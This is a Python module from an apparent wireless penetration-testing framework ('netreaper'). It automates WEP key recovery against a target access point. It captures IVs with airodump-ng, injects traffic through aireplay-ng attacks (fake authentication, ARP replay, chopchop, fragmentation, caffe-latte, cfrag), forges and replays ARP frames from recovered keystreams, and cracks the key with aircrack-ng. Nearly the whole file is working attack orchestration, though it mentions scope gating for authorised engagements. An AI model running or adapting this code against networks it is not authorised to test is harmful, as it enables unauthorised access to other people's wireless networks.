# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (c) 2025 Nerds489
"""WEP key recovery: IV collection, traffic injection, and aircrack-ng.

WEP is broken by collecting enough weak initialisation vectors and running the
statistical/PTW attack over them. This orchestrates the gated adapters, a
channel-locked airodump capture to collect IVs, plus fake authentication and ARP
replay (aireplay) to generate traffic and accelerate collection, then runs
aircrack-ng over the capture to recover the key.

The capture and injection spawn through the gated adapters (PASSIVE capture,
DESTRUCTIVE injection). aircrack-ng reads a local file and touches no network, so
it runs at PASSIVE tier with no target. A scope-gate denial propagates.
"""
from __future__ import annotations

import asyncio
import contextlib
import re
import shutil
import tempfile
from dataclasses import dataclass
from pathlib import Path

from netreaper.core.exceptions import (
    ConfigurationError,
    SubprocessError,
    ToolNotFoundError,
)
from netreaper.core.logging import get_logger
from netreaper.core.process import ProcessRunner, get_process_runner
from netreaper.orchestration.events import Events, event_bus
from netreaper.safety.scope import Tier
from netreaper.tools.aireplay import AireplayTool, AttackMode
from netreaper.tools.airodump import AirodumpTool
from netreaper.tools.packetforge import PacketforgeTool

logger = get_logger(__name__)

_KEY_RE = re.compile(r"KEY FOUND!\s*\[\s*([0-9A-Fa-f: ]+?)\s*\]")


def parse_aircrack_key(output: str) -> str | None:
    """Return the recovered WEP key (hex, no separators) from aircrack output."""
    match = _KEY_RE.search(output)
    if not match:
        return None
    hexkey = match.group(1).replace(":", "").replace(" ", "").lower()
    return hexkey or None


async def crack_capture(
    cap_path: str | Path,
    bssid: str | None = None,
    *,
    runner: ProcessRunner | None = None,
    timeout: float = 120.0,
) -> str | None:
    """Run aircrack-ng over a capture and return the WEP key, or None.

    aircrack-ng reads a local file and makes no network contact, so it runs at
    PASSIVE tier with no target. Missing tool or timeout yields None.
    """
    runner = runner or get_process_runner()
    cmd = ["aircrack-ng", "-a", "1"]
    if bssid:
        cmd += ["-b", bssid]
    cmd.append(str(cap_path))
    try:
        result = await runner.run(cmd, tier=Tier.PASSIVE, timeout=timeout)
    except (SubprocessError, ToolNotFoundError):
        return None
    return parse_aircrack_key(result.stdout + (result.stderr or ""))


# Every WEP injection strategy the aireplay-ng wrapper already implements.
# wep.py drove only "arpreplay" and the CLI exposed no choice at all (#47).
INJECTION_MODES = frozenset(
    {
        "arpreplay",
        "chopchop",
        "fragment",
        "caffe_latte",
        "cfrag",
        "interactive",
    }
)


# The strategies that recover a PRGA keystream rather than just replaying
# traffic. Only these can feed packetforge-ng, because only these produce the
# .xor file it reads. arpreplay replays a captured ARP and recovers nothing.
KEYSTREAM_MODES = frozenset({"chopchop", "fragment", "caffe_latte", "cfrag"})


def _as_data(result) -> dict:
    """Normalise a tool return to its parsed-data dict.

    The named aireplay helpers return ``result.data`` already, while the
    lazily-dispatched strategies return the ``PluginResult`` itself, and a test
    double that implements only the primitive it needs may return neither. The
    return contract is deliberately not tightened in ``_injector``: doing that
    is what the lazy-resolution note there exists to avoid. Normalise here, at
    the one consumer that actually reads the result.
    """
    if result is None:
        return {}
    data = getattr(result, "data", result)
    return data if isinstance(data, dict) else {}


@dataclass
class ForgeResult:
    """Outcome of the keystream -> forge -> replay chain."""

    strategy: str
    keystream_file: str | None = None
    packet_file: str | None = None
    replayed: bool = False
    reason: str | None = None


@dataclass
class WepResult:
    bssid: str
    channel: int
    cracked: bool = False
    key: str | None = None
    cap_file: str | None = None
    rounds: int = 0


class WepAttack:
    """Collect IVs with injection, then recover the WEP key with aircrack-ng."""

    def __init__(
        self,
        airodump: AirodumpTool | None = None,
        aireplay: AireplayTool | None = None,
        cracker=crack_capture,
        packetforge: PacketforgeTool | None = None,
    ) -> None:
        self._airodump = airodump or AirodumpTool()
        self._aireplay = aireplay or AireplayTool()
        self._cracker = cracker
        self._packetforge = packetforge or PacketforgeTool()

    async def run(
        self,
        interface: str,
        bssid: str,
        channel: int,
        *,
        essid: str = "",
        source_mac: str | None = None,
        output: str | None = None,
        capture_seconds: int = 30,
        max_rounds: int = 5,
        use_arpreplay: bool = True,
        injection: str = "arpreplay",
        settle_seconds: int = 3,
    ) -> WepResult:
        """Capture IVs (injection-assisted) and crack, retrying up to max_rounds.

        Args:
            interface: Monitor-mode interface.
            bssid: Target access point BSSID (the scope-checked identifier).
            channel: Target channel.
            essid: Network name (needed for fake authentication).
            source_mac: Attacker MAC for fakeauth/arpreplay; None skips injection.
            output: .cap prefix; a temp file is used when omitted.
            capture_seconds: IV-collection window per round.
            max_rounds: Capture+crack rounds before giving up.
            use_arpreplay: Run ARP replay to speed up IV collection. Kept for
                compatibility; False still means "no injection".
            injection: Which injection strategy to drive IV collection with.
                One of INJECTION_MODES. The primitives for chopchop,
                fragmentation, caffe-latte, cfrag and interactive replay already
                existed in tools/aireplay.py and were simply never called from
                here, and the CLI exposed no way to pick one (issue #47), so the
                orchestrator only ever ran fakeauth + ARP replay.
            settle_seconds: Delay before injecting so airodump is on-channel.
        """
        # Validate the strategy BEFORE any setup. Deferring it to _injector()
        # meant a typo only surfaced mid-attack, after the capture had been
        # arranged, and behind a scope denial if the engagement was wrong too.
        self._injector(injection)

        prefix, cleanup = self._resolve_prefix(output)
        result = WepResult(bssid=bssid, channel=channel)
        try:
            for attempt in range(1, max_rounds + 1):
                result.rounds = attempt
                cap_path = await self._one_round(
                    interface, bssid, channel, essid, source_mac, prefix,
                    capture_seconds, use_arpreplay, settle_seconds, injection,
                )
                key = await self._cracker(cap_path, bssid)
                if key:
                    result.cracked = True
                    result.key = key
                    result.cap_file = str(cap_path)
                    event_bus.emit(
                        Events.CREDENTIAL_CRACKED,
                        {"type": "wep", "bssid": bssid, "password": key},
                    )
                    logger.info("WEP key recovered for %s (round %d)", bssid, attempt)
                    return result
                logger.info("No WEP key yet for %s (%d/%d)", bssid, attempt, max_rounds)
            return result
        finally:
            cleanup()

    async def _one_round(
        self,
        interface: str,
        bssid: str,
        channel: int,
        essid: str,
        source_mac: str | None,
        prefix: str,
        capture_seconds: int,
        use_arpreplay: bool,
        settle_seconds: int,
        injection: str = "arpreplay",
    ) -> Path:
        """Capture IVs while injecting ARP traffic. Returns the cap path."""
        cap_task = asyncio.create_task(
            self._airodump.capture_for_target(
                interface, bssid, channel, prefix, duration=capture_seconds
            )
        )
        replay_task: asyncio.Task | None = None
        try:
            if source_mac:
                await asyncio.sleep(min(settle_seconds, max(0, capture_seconds - 1)))
                await self._aireplay.fakeauth_attack(
                    interface, bssid, source_mac, essid
                )
                if use_arpreplay:
                    replay_task = asyncio.create_task(
                        self._injector(injection)(interface, bssid, source_mac)
                    )
            await cap_task
        except BaseException:
            # A scope-gate denial (TargetValidationError) propagates unchanged.
            cap_task.cancel()
            with contextlib.suppress(asyncio.CancelledError):
                await cap_task
            raise
        finally:
            # ARP replay is best-effort acceleration; tear it down and ignore its
            # cancellation or tool errors (a gate denial for this BSSID would have
            # already surfaced from the awaited fakeauth above).
            if replay_task is not None:
                replay_task.cancel()
                with contextlib.suppress(
                    asyncio.CancelledError, SubprocessError, ToolNotFoundError
                ):
                    await replay_task
        return Path(f"{prefix}-01.cap")

    def _injector(self, injection: str):
        """Pick the injection coroutine for a named strategy.

        Every one of these is an existing aireplay-ng primitive; the gap in #47
        was that only arpreplay was ever reachable. Each still goes through the
        tool wrapper, so each is scope-gated and audited at the seam exactly as
        ARP replay is.
        """
        name = (injection or "arpreplay").strip().lower()
        if name not in INJECTION_MODES:
            raise ConfigurationError(
                f"unknown WEP injection mode {injection!r}; "
                f"choose one of: {', '.join(sorted(INJECTION_MODES))}"
            )
        a = self._aireplay
        # Resolve LAZILY. Building the whole table up front touched
        # chopchop_attack and fragment_attack even when only arpreplay was
        # wanted, so any caller or test double that implements just the
        # primitive it uses died on an AttributeError.
        named = {"arpreplay": "arpreplay_attack",
                 "chopchop": "chopchop_attack",
                 "fragment": "fragment_attack"}
        if name in named:
            return getattr(a, named[name])

        # caffe-latte, cfrag and interactive have no named helper on the wrapper,
        # so drive them through execute() with the mode the wrapper already maps.
        mode = {
            "caffe_latte": AttackMode.CAFFE_LATTE,
            "cfrag": AttackMode.CFRAG,
            "interactive": AttackMode.INTERACTIVE,
        }[name]

        async def _run(iface: str, target_bssid: str, source: str):
            return await a.execute(
                iface,
                {"attack": mode, "bssid": target_bssid, "source": source},
            )

        return _run

    async def forge_and_replay(
        self,
        interface: str,
        bssid: str,
        source_mac: str,
        *,
        strategy: str = "chopchop",
        output: str | None = None,
        **forge_options,
    ) -> ForgeResult:
        """Recover a keystream, forge an ARP request from it, and replay it.

        This is the half of the chopchop and fragmentation attacks that was
        missing. Those attacks exist to recover a PRGA keystream, and both wrote
        one to a ``.xor`` file that nothing in this tree ever opened. Forging a
        frame from it and putting that frame back on the air is the entire point
        of recovering it: the AP rebroadcasts the forged ARP and every reply is
        a fresh IV, which is what aircrack-ng needs.

        Each of the three steps spawns through its own adapter, so each is
        scope-gated and audited at the seam independently. The forge itself is
        PASSIVE (a local file transform) while the replay is not, which is why
        they are separate spawns rather than one.

        Returns a ForgeResult describing how far the chain got. A keystream that
        never appears is a normal outcome, not an error: chopchop against a
        quiet AP simply does not recover one.
        """
        name = (strategy or "chopchop").strip().lower()
        if name not in KEYSTREAM_MODES:
            raise ConfigurationError(
                f"{strategy!r} recovers no keystream; "
                f"choose one of: {', '.join(sorted(KEYSTREAM_MODES))}"
            )

        result = ForgeResult(strategy=name)

        data = _as_data(await self._injector(name)(interface, bssid, source_mac))
        keystream = data.get("keystream_file")
        if not keystream:
            result.reason = "no keystream recovered"
            logger.info("%s recovered no keystream against %s", name, bssid)
            return result
        result.keystream_file = keystream

        packet = output or str(Path(keystream).with_suffix(".forged.cap"))
        forged = await self._packetforge.forge_arp(
            keystream, bssid, source_mac, packet, **forge_options
        )
        if not forged.get("success"):
            result.reason = "packetforge-ng did not write a packet"
            return result
        result.packet_file = forged.get("packet_file") or packet

        # Replay the forged frame. "read_file" is the option _common_args maps
        # to -r; interactive replay without it can only resend what it sniffs.
        replay = _as_data(
            await self._aireplay.execute(
                interface,
                {
                    "attack": AttackMode.INTERACTIVE,
                    "bssid": bssid,
                    "source": source_mac,
                    "read_file": result.packet_file,
                },
            )
        )
        result.replayed = bool(replay.get("success", True))
        return result

    @staticmethod
    def _resolve_prefix(output: str | None):
        """Return (prefix, cleanup). A temp dir is created when output is None."""
        if output:
            return output, lambda: None
        tmp = tempfile.mkdtemp(prefix="netreaper_wep_")
        prefix = str(Path(tmp) / "wep")

        def cleanup() -> None:
            shutil.rmtree(tmp, ignore_errors=True)

        return prefix, cleanup


async def crack_wep(
    interface: str,
    bssid: str,
    channel: int,
    *,
    essid: str = "",
    source_mac: str | None = None,
    output: str | None = None,
    capture_seconds: int = 30,
    max_rounds: int = 5,
    injection: str = "arpreplay",
) -> WepResult:
    """Stateless one-shot WEP attack for the CLI.

    ``injection`` selects the IV-generation strategy; see INJECTION_MODES. The
    CLI had no way to choose one, which is half of #47's WEP gap.
    """
    return await WepAttack().run(
        interface,
        bssid,
        channel,
        essid=essid,
        source_mac=source_mac,
        output=output,
        capture_seconds=capture_seconds,
        max_rounds=max_rounds,
        injection=injection,
    )
